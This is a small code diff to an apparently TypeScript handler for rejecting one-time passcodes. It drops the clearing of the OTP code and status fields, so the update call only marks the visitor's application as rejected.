@@ -89,9 +89,7 @@ export async function handleOtpRejection(
   
   // Reject OTP and notify visitor
   await updateApplication(visitorId, {
-    _v5Status: "rejected",
-    otpCode: "",
-    otpStatus: "show_otp" as any
+    _v5Status: "rejected"
   })
 }
 
